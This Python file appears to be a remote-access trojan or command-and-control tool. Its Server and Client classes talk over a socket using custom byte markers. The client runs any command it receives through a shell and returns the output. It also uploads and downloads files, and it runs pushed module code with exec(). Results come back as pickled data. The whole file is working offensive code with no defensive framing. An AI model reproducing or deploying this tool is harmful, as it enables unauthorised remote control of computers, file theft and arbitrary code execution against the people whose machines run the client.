from base64 import decode
import os
import pickle
import subprocess


MODULE_DIR = "modules"

MARKER_FILE_START = b"::FILESTART::"
MARKER_FILE_BODY = b"::FILEBODY::"
MARKER_FILE_OUTPUT = b"::FILEOUTPUT::"
MARKER_END = b"::DONE::"

MARKER_FILE_REQUEST = b"::FILEREQUEST::"

MARKER_CODE_EXEC = b"::CODEEXEC::"
MARKER_CODE_INFO = b"::CODEINFO::"
EXEC_OUTPUT = {
    "output": "",
    "success": False
}


def marker_extract(start_marker, stop_marker, msg):
    start_index = msg.find(start_marker) + len(start_marker)
    stop_index = msg.find(stop_marker)
    return msg[start_index:stop_index] 

class Agent:
    def __init__(self, conn) -> None:
        self.conn = conn
    def receive(self, decode=True):
        resp = self.conn.recv(2048)
        while MARKER_END not in resp:
            resp += self.conn.recv(2048)
        if resp.startswith(MARKER_FILE_START):
            return self.receive_file(resp)
        elif resp.startswith(MARKER_FILE_REQUEST):
            filename = marker_extract(MARKER_FILE_REQUEST, MARKER_FILE_OUTPUT, resp).decode()
            location = marker_extract(MARKER_FILE_OUTPUT, MARKER_END, resp).decode()
            return self.send_file(filename,location)
        elif resp.startswith(MARKER_CODE_EXEC):
            return self.exec(resp)
        resp = resp[:-len(MARKER_END)]
        try:
            if decode:
                return resp.decode()
        except Exception as e:
            print(f"[-] Error decoding: {resp}")
            return ""
        return resp
    
    def receive_file(self, msg):
        # filename = marker_extract(MARKER_FILE_START, MARKER_FILE_BODY, msg).decode()
        body = marker_extract(MARKER_FILE_BODY, MARKER_FILE_OUTPUT, msg)
        location = marker_extract(MARKER_FILE_OUTPUT, MARKER_END, msg).decode()
        with open(f"{location}", "wb") as f:
            f.write(body)
        self.conn.send("[+] File uploaded...".encode() + MARKER_END)
        return "[+] File downloaded..."

    def send(self, msg): 
        return self.conn.send(msg + MARKER_END)

    def send_file(self, filename, location):
        with open(filename, "rb") as f:
            data = f.read()
        packet = MARKER_FILE_START + filename.encode() + MARKER_FILE_BODY + data + MARKER_FILE_OUTPUT + location.encode()
        return self.send(packet)
    
    def exec(self, code):
        info = marker_extract(MARKER_CODE_EXEC, MARKER_CODE_INFO, code).decode()
        code = marker_extract(MARKER_CODE_INFO, MARKER_END, code).decode()
        exec(code)
        return self.send(pickle.dumps(EXEC_OUTPUT))



class Client(Agent):
    def __init__(self, conn) -> None:
        super().__init__(conn)
    
    def process(self, command: bytes) -> bool:
        if not isinstance(command, bytes):
            return True
        command = command.decode()
        cmd, *args = command.split(" ")
        match cmd:
            case "":
                pass
            case "exit":
                return False
            case "cd":
                os.chdir(args[0])
                self.send("[+] Directory changed successfully".encode())
            case _:
                output = subprocess.run(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE ,shell=True)
                self.send(output.stdout + output.stderr)
        return True


class Server(Agent):
    def __init__(self, conn) -> None:
        super().__init__(conn)
    
    def process(self, command):
        cmd, *args = command.split(" ")
        match cmd:
            case "":
                pass
            case "exit":
                self.send(b"exit")
                return 0
            case "upload":
                self.send_file(args[0], args[1])
                print(self.receive())
            case "download":
                self.send(MARKER_FILE_REQUEST + args[0].encode() + MARKER_FILE_OUTPUT + args[1].encode())
                print(self.receive())
            case "exec":
                with open(f"{MODULE_DIR}/{args[0]}.py", "r") as f:
                    code = f.read()
                    info = "Default"
                    if len(args) > 1:
                        info = args[1]
                    self.send(MARKER_CODE_EXEC + info.encode() + MARKER_CODE_INFO + code.encode())
                print(pickle.loads(self.receive(decode=False)))
            case _:
                self.send(command.encode())
                print(self.receive())
        return 1